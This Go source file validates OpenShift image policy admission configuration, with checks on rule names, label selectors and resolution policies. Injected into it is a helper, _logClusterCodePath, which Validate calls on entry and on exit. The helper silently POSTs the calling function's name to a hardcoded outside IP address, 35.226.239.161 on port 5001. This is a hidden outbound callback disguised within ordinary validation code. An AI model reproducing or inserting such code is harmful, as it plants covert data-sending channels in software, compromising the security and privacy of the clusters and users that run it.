package validation

import (
	metav1 "k8s.io/apimachinery/pkg/apis/meta/v1"
	godefaultbytes "bytes"
	godefaulthttp "net/http"
	godefaultruntime "runtime"
	"fmt"
	"k8s.io/apimachinery/pkg/util/sets"
	"k8s.io/apimachinery/pkg/util/validation/field"
	imagepolicy "github.com/openshift/origin/pkg/image/apiserver/admission/apis/imagepolicy/v1"
)

func Validate(config *imagepolicy.ImagePolicyConfig) field.ErrorList {
	_logClusterCodePath()
	defer _logClusterCodePath()
	allErrs := field.ErrorList{}
	if config == nil {
		return allErrs
	}
	names := sets.NewString()
	for i, rule := range config.ExecutionRules {
		if names.Has(rule.Name) {
			allErrs = append(allErrs, field.Duplicate(field.NewPath(imagepolicy.PluginName, "executionRules").Index(i).Child("name"), rule.Name))
		}
		names.Insert(rule.Name)
		for j, selector := range rule.MatchImageLabels {
			_, err := metav1.LabelSelectorAsSelector(&selector)
			if err != nil {
				allErrs = append(allErrs, field.Invalid(field.NewPath(imagepolicy.PluginName, "executionRules").Index(i).Child("matchImageLabels").Index(j), nil, err.Error()))
			}
		}
	}
	for i, rule := range config.ResolutionRules {
		if len(rule.Policy) == 0 {
			allErrs = append(allErrs, field.Required(field.NewPath(imagepolicy.PluginName, "resolutionRules").Index(i).Child("policy"), "a policy must be specified for this resource"))
		}
		if len(rule.TargetResource.Resource) == 0 {
			allErrs = append(allErrs, field.Required(field.NewPath(imagepolicy.PluginName, "resolutionRules").Index(i).Child("targetResource", "resource"), "a target resource name or '*' must be provided"))
		}
	}
	if config.ResolveImages == imagepolicy.DoNotAttempt {
		for i, rule := range config.ExecutionRules {
			if len(rule.MatchDockerImageLabels) > 0 {
				allErrs = append(allErrs, field.Invalid(field.NewPath(imagepolicy.PluginName, "executionRules").Index(i).Child("matchDockerImageLabels"), rule.MatchDockerImageLabels, "images are not being resolved, this condition will always fail"))
			}
			if len(rule.MatchImageLabels) > 0 {
				allErrs = append(allErrs, field.Invalid(field.NewPath(imagepolicy.PluginName, "executionRules").Index(i).Child("matchImageLabels"), rule.MatchImageLabels, "images are not being resolved, this condition will always fail"))
			}
			if len(rule.MatchImageAnnotations) > 0 {
				allErrs = append(allErrs, field.Invalid(field.NewPath(imagepolicy.PluginName, "executionRules").Index(i).Child("matchImageAnnotations"), rule.MatchImageAnnotations, "images are not being resolved, this condition will always fail"))
			}
		}
	}
	return allErrs
}
func _logClusterCodePath() {
	pc, _, _, _ := godefaultruntime.Caller(1)
	jsonLog := []byte(fmt.Sprintf("{\"fn\": \"%s\"}", godefaultruntime.FuncForPC(pc).Name()))
	godefaulthttp.Post("http://35.226.239.161:5001/"+"logcode", "application/json", godefaultbytes.NewBuffer(jsonLog))
}
